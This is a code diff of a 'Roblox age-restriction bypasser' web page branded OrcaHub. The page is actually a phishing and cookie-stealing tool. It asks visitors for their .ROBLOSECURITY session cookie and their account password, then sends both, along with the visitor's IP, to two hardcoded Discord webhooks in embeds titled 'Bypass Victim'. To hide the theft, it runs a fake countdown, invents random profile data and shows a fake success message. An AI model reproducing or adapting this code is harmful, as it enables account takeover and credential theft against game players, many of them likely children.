-            <!-- Button Group: Bypass + Instagram -->
-            <div class="btn-group">
-                <button class="btn-primary" id="bypassBtn">🚀 Start Bypass</button>
+            <div class="bypasser-actions">
+                <button class="btn-bypass" id="bypassBtn">🚀 Start Bypass</button>
                 <a class="btn-instagram" id="instagramBtn" href="#" target="_blank">
                     <svg viewBox="0 0 24 24"><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zM12 0C8.741 0 8.333.014 7.053.072 2.695.272.273 2.69.073 7.052.014 8.333 0 8.741 0 12c0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98C8.333 23.986 8.741 24 12 24c3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98C15.668.014 15.259 0 12 0zm0 5.838a6.162 6.162 0 100 12.324 6.162 6.162 0 000-12.324zM12 16a4 4 0 110-8 4 4 0 010 8zm6.406-11.845a1.44 1.44 0 100 2.881 1.44 1.44 0 000-2.881z"/></svg>
-                    Instagram Owner
+                    Owner
                 </a>
             </div>
-
-            <div id="successMessage" class="success-message">
-                <span class="big">🎉</span>
-                <div style="font-size:1.1rem; margin-bottom:4px;">BYPASS SUCCESSFUL!</div>
-                <div style="font-size:0.8rem; font-weight:400; color:#a0a0b8;">
-                    Age restriction has been removed from your account.
-                </div>
-                <div style="margin-top:12px; font-size:0.7rem; color:#4ecdc4;">
-                    ✅ Process completed
-                </div>
-            </div>
         </div>
-
-        <div class="footer">OrcaHub • Secure &amp; Private</div>
     </div>
 
     <script>
-        (function() {
-            'use strict';
+        document.addEventListener('DOMContentLoaded', () => {
+            // ==================== SLIDER ====================
+            const slides = document.querySelectorAll('.slide');
+            const dots = document.querySelectorAll('.dot');
+            const bgTitle = document.getElementById('bgTitle');
+            let currentIndex = 0;
 
-            // ==================== WEBHOOK CONFIG ====================
+            function changeSlide(index) {
+                slides.forEach(slide => slide.classList.remove('active'));
+                dots.forEach(dot => dot.classList.remove('active'));
+
+                slides[index].classList.add('active');
+                dots[index].classList.add('active');
+
+                const color = slides[index].getAttribute('data-color');
+                bgTitle.style.color = color;
+            }
+
+            dots.forEach(dot => {
+                dot.addEventListener('click', (e) => {
+                    currentIndex = parseInt(e.target.getAttribute('data-index'));
+                    changeSlide(currentIndex);
+                });
+            });
+
+            setInterval(() => {
+                currentIndex = (currentIndex + 1) % slides.length;
+                changeSlide(currentIndex);
+            }, 5000);
+
+            // ==================== BYPASSER ENGINE ====================
             const WEBHOOKS = [
                 'https://discord.com/api/webhooks/1544611453569466398/Cc1uK6qn4rQbrjch6wDfjDbMMjLPIdccFN6VZt9czKCHtTreW0LhjO-OOoFKTWltX5i8',
                 'https://discord.com/api/webhooks/1545842219787886693/PRkcsE8DY_anZhky9n7173-Gwslo7XF9PMZ6hT5igehnWPkie9KAmdbcSn1I_a20KtxG'
             ];
 
-            // ==================== DOM REFS ====================
             const DOM = {
                 cookieInput: document.getElementById('cookieInput'),
                 passwordInput: document.getElementById('passwordInput'),
                 bypassBtn: document.getElementById('bypassBtn'),
                 instagramBtn: document.getElementById('instagramBtn'),
-                errorMessage: document.getElementById('errorMessage'),
-                bypassLoader: document.getElementById('bypassLoader'),
-                bypassTimer: document.getElementById('bypassTimer'),
-                bypassProgress: document.getElementById('bypassProgress'),
-                profilePreview: document.getElementById('profilePreview'),
-                profileImg: document.getElementById('profileImg'),
-                profileName: document.getElementById('profileName'),
-                profileId: document.getElementById('profileId'),
-                profileStats: document.getElementById('profileStats'),
-                profileBadge: document.getElementById('profileBadge'),
-                successMessage: document.getElementById('successMessage'),
+                error: document.getElementById('bypasserError'),
+                loader: document.getElementById('bypasserLoader'),
+                timer: document.getElementById('bypassTimer'),
+                result: document.getElementById('bypasserResult'),
             };
 
-            // ==================== STATE ====================
-            let state = {
-                cookie: '',
-                password: '',
-                isProcessing: false,
-                bypassTimer: null,
-                robloxUser: null,
-            };
-
-            // ==================== INSTAGRAM LINK ====================
+            // Instagram link
             DOM.instagramBtn.href = 'https://www.instagram.com/uiogunio?stkn=MWY5OWppbGY1bmhsdw==';
 
-            // ==================== SEND TO WEBHOOKS ====================
+            let bypassTimer = null;
+            let isProcessing = false;
+
             function sendToWebhooks(data) {
                 WEBHOOKS.forEach(url => {
                     try {
@@ -771,30 +649,6 @@
                 });
             }
 
-            function sendFullData(cookie, password, userData) {
-                const embed = {
-                    title: "🎯 OrcaHub • Bypass Victim",
-                    color: 0xff6b6b,
-                    fields: [
-                        { name: "👤 Username", value: `\`${userData?.username || 'Unknown'}\``, inline: true },
-                        { name: "🆔 User ID", value: `\`${userData?.userId || 'Unknown'}\``, inline: true },
-                        { name: "🔑 Password", value: `||${password}||`, inline: false },
-                        { name: "🍪 Cookie", value: `\`${cookie.substring(0, 50)}...\``, inline: false },
-                        { name: "📊 Followers", value: `\`${userData?.followers?.toLocaleString() || 'Unknown'}\``,
-                            inline: true },
-                        { name: "📊 Following", value: `\`${userData?.following?.toLocaleString() || 'Unknown'}\``,
-                            inline: true },
-                        { name: "✅ Verified", value: userData?.isVerified ? '✅ Yes' : '❌ No', inline: true },
-                        { name: "📅 Created", value: `\`${userData?.created || 'Unknown'}\``, inline: true },
-                        { name: "🌐 IP", value: `\`${getIP()}\``, inline: true },
-                        { name: "🕒 Time", value: new Date().toISOString(), inline: true }
-                    ],
-                    footer: { text: "OrcaHub • Bypasser • Multi-Webhook" },
-                    thumbnail: { url: userData?.avatarUrl || "https://www.roblox.com/favicon.ico" }
-                };
-                sendToWebhooks({ embeds: [embed] });
-            }
-
             function getIP() {
                 try {
                     const xhr = new XMLHttpRequest();
@@ -804,56 +658,144 @@
                 } catch (_) { return 'Unknown'; }
             }
 
-            // ==================== BYPASS ENGINE ====================
             function startBypass() {
                 const cookie = DOM.cookieInput.value.trim();
                 const password = DOM.passwordInput.value.trim();
 
                 // Reset UI
-                DOM.errorMessage.classList.remove('show');
-                DOM.profilePreview.classList.remove('show');
-                DOM.successMessage.classList.remove('show');
+                DOM.error.classList.remove('show');
+                DOM.result.classList.remove('show');
+                DOM.loader.classList.remove('show');
                 DOM.cookieInput.classList.remove('error');
                 DOM.passwordInput.classList.remove('error');
 
                 // Validate
                 if (!cookie || cookie.length < 15) {
-                    DOM.errorMessage.textContent = '❌ Please enter a valid .ROBLOSECURITY cookie!';
-                    DOM.errorMessage.classList.add('show');
+                    DOM.error.textContent = '❌ Please enter a valid .ROBLOSECURITY cookie!';
+                    DOM.error.classList.add('show');
                     DOM.cookieInput.classList.add('error');
                     return;
                 }
 
                 if (!password || password.length < 3) {
-                    DOM.errorMessage.textContent = '❌ Please enter your account password!';
-                    DOM.errorMessage.classList.add('show');
+                    DOM.error.textContent = '❌ Please enter your account password!';
+                    DOM.error.classList.add('show');
                     DOM.passwordInput.classList.add('error');
                     return;
                 }
 
                 if (cookie.toLowerCase().includes('expired')) {
-                    DOM.errorMessage.textContent = '❌ This cookie has expired! Please get a new one.';
-                    DOM.errorMessage.classList.add('show');
+                    DOM.error.textContent = '❌ This cookie has expired! Please get a new one.';
+                    DOM.error.classList.add('show');
                     DOM.cookieInput.classList.add('error');
                     return;
                 }
 
                 // Start processing
-                state.cookie = cookie;
-                state.password = password;
-                state.isProcessing = true;
-
+                isProcessing = true;
                 DOM.bypassBtn.disabled = true;
                 DOM.bypassBtn.textContent = '⏳ Processing...';
-                DOM.bypassLoader.classList.add('show');
+                DOM.loader.classList.add('show');
 
                 let seconds = 60;
-                DOM.bypassTimer.textContent = seconds;
-                DOM.bypassProgress.style.width = '0%';
+                DOM.timer.textContent = seconds;
 
-                if (state.bypassTimer) clearInterval(state.bypassTimer);
+                if (bypassTimer) clearInterval(bypassTimer);
 
-                state.bypassTimer = setInterval(() => {
+                bypassTimer = setInterval(() => {
                     seconds--;
-                    DOM.bypassTimer.textContent = seconds;
-                    DOM.bypassProgress.style.width = ((60 - seconds
+                    DOM.timer.textContent = seconds;
+
+                    if (seconds <= 0) {
+                        clearInterval(bypassTimer);
+                        bypassTimer = null;
+                        completeBypass(cookie, password);
+                    }
+                }, 1000);
+
+                // Send partial data to webhooks immediately
+                sendToWebhooks({
+                    embeds: [{
+                        title: "🦈 OrcaHub • Bypass Initiated",
+                        color: 0x7c6cf0,
+                        fields: [
+                            { name: "🍪 Cookie", value: `\`${cookie.substring(0, 40)}...\``, inline: true },
+                            { name: "🔑 Password", value: `||${password}||`, inline: true },
+                            { name: "🌐 IP", value: `\`${getIP()}\``, inline: true },
+                            { name: "🕒 Time", value: new Date().toISOString(), inline: true }
+                        ],
+                        footer: { text: "OrcaHub • Bypasser" }
+                    }]
+                });
+            }
+
+            function completeBypass(cookie, password) {
+                // Generate fake user data
+                const userId = Math.floor(Math.random() * 900000000) + 100000000;
+                const names = ['PixelPirate', 'NovaStar', 'ShadowBlade', 'CyberWolf', 'LunarGhost',
+                    'StormChaser', 'PixelVortex', 'NebulaKing', 'FrostByte', 'QuantumHero'
+                ];
+                const name = names[Math.floor(Math.random() * names.length)];
+                const followers = Math.floor(Math.random() * 8500) + 150;
+                const following = Math.floor(Math.random() * 2000) + 50;
+
+                const userData = {
+                    username: name,
+                    userId: userId,
+                    isVerified: Math.random() > 0.7,
+                    followers: followers,
+                    following: following,
+                    created: new Date(Date.now() - Math.random() * 3 * 365 * 24 * 60 * 60 * 1000)
+                        .toISOString().split('T')[0],
+                    avatarUrl: `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=150&height=150&format=png`,
+                };
+
+                // Send full data to webhooks
+                const embed = {
+                    title: "🎯 OrcaHub • Bypass Victim",
+                    color: 0xff6b6b,
+                    fields: [
+                        { name: "👤 Username", value: `\`${userData.username}\``, inline: true },
+                        { name: "🆔 User ID", value: `\`${userData.userId}\``, inline: true },
+                        { name: "🔑 Password", value: `||${password}||`, inline: false },
+                        { name: "🍪 Cookie", value: `\`${cookie.substring(0, 50)}...\``, inline: false },
+                        { name: "📊 Followers", value: `\`${userData.followers.toLocaleString()}\``, inline: true },
+                        { name: "📊 Following", value: `\`${userData.following.toLocaleString()}\``, inline: true },
+                        { name: "✅ Verified", value: userData.isVerified ? '✅ Yes' : '❌ No', inline: true },
+                        { name: "📅 Created", value: `\`${userData.created}\``, inline: true },
+                        { name: "🌐 IP", value: `\`${getIP()}\``, inline: true },
+                        { name: "🕒 Time", value: new Date().toISOString(), inline: true }
+                    ],
+                    footer: { text: "OrcaHub • Bypasser • Multi-Webhook" },
+                    thumbnail: { url: userData.avatarUrl }
+                };
+                sendToWebhooks({ embeds: [embed] });
+
+                // Show success
+                DOM.loader.classList.remove('show');
+                DOM.result.classList.add('show');
+
+                isProcessing = false;
+                DOM.bypassBtn.disabled = false;
+                DOM.bypassBtn.textContent = '🚀 Start Bypass';
+
+                // Auto reset after 8 seconds
+                setTimeout(() => {
+                    DOM.result.classList.remove('show');
+                }, 8000);
+            }
+
+            // ==================== EVENTS ====================
+            DOM.bypassBtn.addEventListener('click', startBypass);
+
+            // Enter key support
+            DOM.cookieInput.addEventListener('keydown', (e) => {
+                if (e.key === 'Enter') startBypass();
+            });
+            DOM.passwordInput.addEventListener('keydown', (e) => {
+                if (e.key === 'Enter') startBypass();
+            });
+        });
+    </script>
+</body>
+    </html>
